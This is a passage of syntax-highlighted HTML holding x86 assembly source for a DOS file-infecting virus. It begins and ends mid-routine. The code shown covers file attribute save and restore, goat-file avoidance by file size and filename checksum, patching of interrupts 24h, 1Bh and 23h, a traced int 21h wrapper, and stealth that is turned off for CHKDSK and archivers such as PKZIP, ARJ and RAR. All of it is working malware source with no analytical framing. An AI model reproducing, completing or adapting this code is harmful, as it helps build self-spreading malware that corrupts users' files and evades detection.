        </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">; End.</span><span class="sc0">
</span><span class="sc5">CambiaAtributos</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to check if the file size is multiple of 512 or 500</span><span class="sc0">
</span><span class="sc5">MiraSiRoundedSize</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">      </span><span class="sc1">; 512</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; If remainder=0, bad thing (it could be</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; a goat file)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1F4h</span><span class="sc0">      </span><span class="sc1">; 500</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; If remainder=0, bad thing (it could be</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; a goat file).</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
  </span><span class="sc5">@@Retorna</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">MiraSiRoundedSize</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Little DATA section for the "CambiaAtributos" and "RestauraAtributos"</span><span class="sc0">
</span><span class="sc1">;; routine</span><span class="sc0">
</span><span class="sc5">Atributos</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Anterior_Count</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ModoAcceso</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This part is very used in the virus (place where the time/date fields are</span><span class="sc0">
</span><span class="sc1">;; saved during dis/infection)</span><span class="sc0">
</span><span class="sc5">Hora</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Fecha</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Procedure to restore file attributes</span><span class="sc0">
</span><span class="sc5">RestauraAtributos</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Anterior_Count</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore all</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Atributos</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ModoAcceso</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">               </span><span class="sc1">; End</span><span class="sc0">
</span><span class="sc5">RestauraAtributos</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Routine to patch int 24h, 1Bh and 23h</span><span class="sc0">
</span><span class="sc5">ParcheaInt24h</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Get int 24h vector on ES:BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Exchange first</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; five bytes with the construc-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc1">; ted jump to our</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; int 24h</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BytesInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1Bh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get vector to int 1Bh and</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ByteInt1Bh</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; patch it with an IRET</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ByteInt1Bh</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">23h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; The same for int 23h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ByteInt23h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ByteInt23h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ParcheaInt24h</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Zone where the 32 bit jump is constructed</span><span class="sc0">
</span><span class="sc5">BytesInt24h</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;; Program of int 24h</span><span class="sc0">
</span><span class="sc5">ProgramaInt24h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">    </span><span class="sc1">; Ignore error</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">EstadoInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; An error has</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">                        </span><span class="sc1">; happened! and</span><span class="sc0">
                                </span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc5">ByteInt1Bh</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CFh</span><span class="sc0">      </span><span class="sc1">; Iret</span><span class="sc0">
</span><span class="sc5">ByteInt23h</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CFh</span><span class="sc0">      </span><span class="sc1">; Iret</span><span class="sc0">

</span><span class="sc1">;; Procedure to get the name of the file that will be terminated with a "termi-</span><span class="sc0">
</span><span class="sc1">;; nate execution" function</span><span class="sc0">
</span><span class="sc5">ObtenNombre</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc0">   </span><span class="sc1">; Get PSP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">002Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get Environment-Block segment</span><span class="sc0">
                        </span><span class="sc1">; in ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SCASB</span><span class="sc0">       </span><span class="sc1">; Search for a double 0</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Loop01</span><span class="sc0">
        </span><span class="sc6">SCASB</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Loop01</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">  </span><span class="sc1">; Increase DI to get on ES:DI the name of the</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">  </span><span class="sc1">; file currently in execution</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">  </span><span class="sc1">; Return the name in DS:DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ObtenNombre</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;;; EMULATION OF "INT 21h". It has an error handler, so, if int 24h is called,</span><span class="sc0">
</span><span class="sc1">;;;; int 21h will return Carry Flag</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">             </span><span class="sc1">; Put 0 on the error variable. Int 24h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">EstadoInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; set this to 3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Call traced int 21h</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">            </span><span class="sc1">; Save flags</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">EstadoInt24h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Int 24h error?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">        </span><span class="sc1">; Then, jump</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">               </span><span class="sc1">; Restore flags and exit</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
      </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POPF</span><span class="sc0">               </span><span class="sc1">; Nivelate stack</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">            </span><span class="sc1">; Set Carry Flag</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">Int21h</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;; Procedure to check if stealth must be avoided or not</span><span class="sc0">
</span><span class="sc5">MirarsiStealth</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get first two bytes of the</span><span class="sc0">
                         </span><span class="sc1">; file name in AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'HC'</span><span class="sc0">               </span><span class="sc1">; Check if file is CHKDSK</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salta1</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'DK'</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salta1</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'KS'</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ActivaStealth</span><span class="sc0">       </span><span class="sc1">; If it is, don't do stealth</span><span class="sc0">
    </span><span class="sc5">@@Salta1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'KP'</span><span class="sc0">            </span><span class="sc1">; Check if file is PK* (PKZIP,etc.)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ActivaStealth</span><span class="sc0">       </span><span class="sc1">; If it is, don't do stealth</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RA'</span><span class="sc0">            </span><span class="sc1">; "ARJ"?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salta2</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'J'</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ActivaStealth</span><span class="sc0">       </span><span class="sc1">; Don't do stealth, then</span><span class="sc0">
    </span><span class="sc5">@@Salta2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AR'</span><span class="sc0">            </span><span class="sc1">; "RAR"?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salta3</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ActivaStealth</span><span class="sc0">       </span><span class="sc1">; Don't do stealth, then</span><span class="sc0">
    </span><span class="sc5">@@Salta3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'HL'</span><span class="sc0">            </span><span class="sc1">; "LH*"? (LHARC, LHA, etc.)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ActivaStealth</span><span class="sc0">       </span><span class="sc1">; Don't do stealth, then</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NoStealth</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; DO stealth!</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">@@ActivaStealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NoStealth</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; DON'T do stealth!</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">MirarsiStealth</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura16</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Routine to get SFT from a handle. The SFT address is returned in ES:DI</span><span class="sc0">
</span><span class="sc5">GetSFT</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1220h</span><span class="sc0">   </span><span class="sc1">; Get Job File Table</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@KKVF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get in BL the number of SFT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; ®Is the handle opened?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKVF</span><span class="sc0">        </span><span class="sc1">; If it isn't, return with Carry Flag</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1216h</span><span class="sc0">   </span><span class="sc1">; Get System File Table</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@KKVF</span><span class="sc0">        </span><span class="sc1">; If Carry, return with Carry :)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CLC</span><span class="sc0">         </span><span class="sc1">; Clear Carry Flag and exit</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
     </span><span class="sc5">@@KKVF</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">         </span><span class="sc1">; Set Carry Flag and exit</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">GetSFT</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to do a checksum of the file name and compare it to the checksum</span><span class="sc0">
</span><span class="sc1">;; of the file infected before. If it differs by 1, returns with Carry Flag.</span><span class="sc0">
</span><span class="sc1">;; This is done to avoid goat files. With following names, only the first file</span><span class="sc0">
</span><span class="sc1">;; will be infected.</span><span class="sc0">
</span><span class="sc5">CompruebaNombre</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Desinfeccion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">; Infecting KEYB?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">           </span><span class="sc1">; If not, continue</span><span class="sc0">
